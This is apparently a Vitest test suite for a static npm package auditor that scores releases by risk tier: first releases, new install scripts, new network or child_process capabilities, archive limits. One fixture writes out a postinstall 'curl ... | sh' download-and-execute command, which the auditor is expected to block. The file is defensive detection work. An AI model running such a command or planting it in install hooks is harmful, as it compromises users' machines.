import { mkdtemp, mkdir, rm, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import * as tar from "tar";
import { afterEach, describe, expect, it } from "vitest";
import type { NpmVersionManifest } from "../npm/payload.js";
import { evaluateStaticAudit, type StaticAuditInput } from "./static.js";

const temporaryDirectories: string[] = [];

afterEach(async () => {
  await Promise.all(
    temporaryDirectories
      .splice(0)
      .map((directory) => rm(directory, { recursive: true, force: true })),
  );
});

async function buildTarball(
  files: Record<string, string | Buffer>,
): Promise<Buffer> {
  const directory = await mkdtemp(join(tmpdir(), "veripack-test-"));
  temporaryDirectories.push(directory);
  await mkdir(join(directory, "package"), { recursive: true });

  for (const [path, content] of Object.entries(files)) {
    const target = join(directory, "package", path);
    await mkdir(join(target, ".."), { recursive: true });
    await writeFile(target, content);
  }

  const chunks: Buffer[] = [];
  const stream = tar.c(
    { gzip: true, cwd: directory, portable: true },
    ["package"],
  );
  stream.on("data", (chunk: Buffer) => chunks.push(chunk));
  await new Promise<void>((resolve, reject) => {
    stream.on("end", resolve);
    stream.on("error", reject);
  });
  return Buffer.concat(chunks);
}

function manifest(overrides: Partial<NpmVersionManifest> = {}): NpmVersionManifest {
  return {
    name: "@veripack/example",
    version: "1.0.0",
    trust: { intent: "Add a small helper." },
    ...overrides,
  };
}

async function input(
  overrides: Partial<StaticAuditInput> = {},
): Promise<StaticAuditInput> {
  const currentManifest = overrides.manifest ?? manifest();
  const tarball =
    overrides.tarball ??
    (await buildTarball({
      "package.json": JSON.stringify(currentManifest),
      "index.js": "export const value = 1;\n",
    }));

  return {
    packageName: "@veripack/example",
    version: "1.0.0",
    publisher: "alice",
    manifest: currentManifest,
    intent: "Add a small helper.",
    tarball,
    previous: null,
    firstRelease: false,
    ...overrides,
  };
}

describe("evaluateStaticAudit", () => {
  it("requires review for a first release even when it is benign", async () => {
    const result = await evaluateStaticAudit(
      await input({ firstRelease: true }),
    );

    expect(result.riskTier).toBe("high");
    expect(result.policyResult).toBe("warn");
    expect(result.autoApprove).toBe(false);
    expect(result.signals.some((signal) => signal.type === "first_release")).toBe(
      true,
    );
    expect(result.changeSet.engine).toBe("static");
  });

  it("auto-approves a docs-only release with an unchanged capability set", async () => {
    const previousManifest = manifest({ version: "1.0.0" });
    const previousTarball = await buildTarball({
      "package.json": JSON.stringify(previousManifest),
      "index.js": "export const value = 1;\n",
      "README.md": "old docs\n",
    });
    const currentManifest = manifest({ version: "1.0.1" });
    const currentTarball = await buildTarball({
      "package.json": JSON.stringify(currentManifest),
      "index.js": "export const value = 1;\n",
      "README.md": "new docs\n",
    });

    const result = await evaluateStaticAudit(
      await input({
        manifest: currentManifest,
        tarball: currentTarball,
        previous: {
          version: "1.0.0",
          publisher: "alice",
          manifest: previousManifest,
          tarball: previousTarball,
        },
      }),
    );

    expect(result.riskTier).toBe("low");
    expect(result.policyResult).toBe("pass");
    expect(result.autoApprove).toBe(true);
    expect(
      result.signals.some((signal) => signal.type === "docs_tests_only"),
    ).toBe(true);
  });

  it("flags a new install script as high risk", async () => {
    const previousManifest = manifest({ version: "1.0.0" });
    const previousTarball = await buildTarball({
      "package.json": JSON.stringify(previousManifest),
      "index.js": "export const value = 1;\n",
    });
    const currentManifest = manifest({
      version: "2.0.0",
      scripts: { postinstall: "node ./setup.js" },
    });
    const currentTarball = await buildTarball({
      "package.json": JSON.stringify(currentManifest),
      "index.js": "export const value = 2;\n",
      "setup.js": "console.log('setup');\n",
    });

    const result = await evaluateStaticAudit(
      await input({
        version: "2.0.0",
        manifest: currentManifest,
        tarball: currentTarball,
        previous: {
          version: "1.0.0",
          publisher: "alice",
          manifest: previousManifest,
          tarball: previousTarball,
        },
      }),
    );

    expect(result.riskTier).toBe("high");
    expect(
      result.signals.some((signal) => signal.type === "install_script_added"),
    ).toBe(true);
    expect(result.autoApprove).toBe(false);
  });

  it("blocks a download-and-execute install script", async () => {
    const currentManifest = manifest({
      scripts: { postinstall: "curl -fsSL https://example.invalid/x.sh | sh" },
    });
    const tarball = await buildTarball({
      "package.json": JSON.stringify(currentManifest),
      "index.js": "export const value = 1;\n",
    });

    const result = await evaluateStaticAudit(
      await input({ manifest: currentManifest, tarball }),
    );

    expect(result.riskTier).toBe("critical");
    expect(result.policyResult).toBe("block");
    expect(result.intentVerdict).toBe("mismatch");
    expect(
      result.signals.some(
        (signal) => signal.type === "install_script_download_exec",
      ),
    ).toBe(true);
  });

  it("flags a new network capability as medium risk", async () => {
    const previousManifest = manifest({ version: "1.0.0" });
    const previousTarball = await buildTarball({
      "package.json": JSON.stringify(previousManifest),
      "index.js": "export const value = 1;\n",
    });
    const currentManifest = manifest({ version: "1.0.1" });
    const currentTarball = await buildTarball({
      "package.json": JSON.stringify(currentManifest),
      "index.js": "export const value = await fetch('https://example.com');\n",
    });

    const result = await evaluateStaticAudit(
      await input({
        version: "1.0.1",
        manifest: currentManifest,
        tarball: currentTarball,
        previous: {
          version: "1.0.0",
          publisher: "alice",
          manifest: previousManifest,
          tarball: previousTarball,
        },
      }),
    );

    expect(result.riskTier).toBe("medium");
    expect(result.policyResult).toBe("warn");
    expect(
      result.signals.some((signal) => signal.ruleId === "new-capability-network"),
    ).toBe(true);
    expect(result.autoApprove).toBe(false);
  });

  it("flags a new child_process capability as high risk", async () => {
    const previousManifest = manifest({ version: "1.0.0" });
    const previousTarball = await buildTarball({
      "package.json": JSON.stringify(previousManifest),
      "index.js": "export const value = 1;\n",
    });
    const currentManifest = manifest({ version: "1.0.1" });
    const currentTarball = await buildTarball({
      "package.json": JSON.stringify(currentManifest),
      "index.js": "import { exec } from 'node:child_process';\nexport const run = exec;\n",
    });

    const result = await evaluateStaticAudit(
      await input({
        version: "1.0.1",
        manifest: currentManifest,
        tarball: currentTarball,
        previous: {
          version: "1.0.0",
          publisher: "alice",
          manifest: previousManifest,
          tarball: previousTarball,
        },
      }),
    );

    expect(result.riskTier).toBe("high");
    expect(
      result.signals.some(
        (signal) => signal.ruleId === "new-capability-child_process",
      ),
    ).toBe(true);
  });

  it("analyzes TypeScript source without executing it", async () => {
    const previousManifest = manifest({ version: "1.0.0" });
    const previousTarball = await buildTarball({
      "package.json": JSON.stringify(previousManifest),
      "index.ts": "export const value: number = 1;\n",
    });
    const currentManifest = manifest({ version: "1.0.1" });
    const currentTarball = await buildTarball({
      "package.json": JSON.stringify(currentManifest),
      "index.ts":
        "import { exec } from 'node:child_process';\nexport const env = process.env.TEST;\nexport const run = exec;\n",
    });

    const result = await evaluateStaticAudit(
      await input({
        version: "1.0.1",
        manifest: currentManifest,
        tarball: currentTarball,
        previous: {
          version: "1.0.0",
          publisher: "alice",
          manifest: previousManifest,
          tarball: previousTarball,
        },
      }),
    );

    expect(result.changeSet.code).toMatchObject({ languages: { typescript: 1 } });
    expect(
      result.signals.some((signal) => signal.ruleId === "new-capability-child_process"),
    ).toBe(true);
    expect(
      result.signals.some((signal) => signal.ruleId === "new-capability-env_access"),
    ).toBe(true);
  });

  it("records lifecycle scripts found in bundled dependency provenance", async () => {
    const currentManifest = manifest();
    const tarball = await buildTarball({
      "package.json": JSON.stringify(currentManifest),
      "index.js": "export const value = 1;\n",
      "node_modules/native-addon/package.json": JSON.stringify({
        name: "native-addon",
        version: "1.0.0",
        scripts: { install: "node-gyp rebuild" },
      }),
      "package-lock.json": JSON.stringify({
        lockfileVersion: 3,
        packages: { "node_modules/native-addon": { hasInstallScript: true } },
      }),
    });

    const result = await evaluateStaticAudit(await input({ manifest: currentManifest, tarball }));
    expect(result.signals.some((signal) => signal.type === "bundled_dependency_install_script")).toBe(true);
    expect(result.signals.some((signal) => signal.type === "dependency_install_script_provenance")).toBe(true);
    expect(result.changeSet.dependencyProvenance).toMatchObject({
      lockfiles: ["package-lock.json"],
    });
  });

  it("blocks when the archive manifest identity does not match the publish", async () => {
    const currentManifest = manifest();
    const tarball = await buildTarball({
      "package.json": JSON.stringify({
        ...currentManifest,
        name: "@veripack/other-package",
      }),
      "index.js": "export const value = 1;\n",
    });

    const result = await evaluateStaticAudit(
      await input({ manifest: currentManifest, tarball }),
    );

    expect(result.riskTier).toBe("critical");
    expect(
      result.signals.some(
        (signal) =>
          signal.type === "archive-manifest-identity-mismatch" &&
          signal.severity === "critical",
      ),
    ).toBe(true);
  });

  it("blocks an archive that exceeds the file-count limit", async () => {
    const result = await evaluateStaticAudit(
      await input({ limits: { maxFiles: 1 } }),
    );

    expect(result.riskTier).toBe("critical");
    expect(result.policyResult).toBe("block");
    expect(
      result.signals.some((signal) => signal.type === "archive_limit_exceeded"),
    ).toBe(true);
  });
});
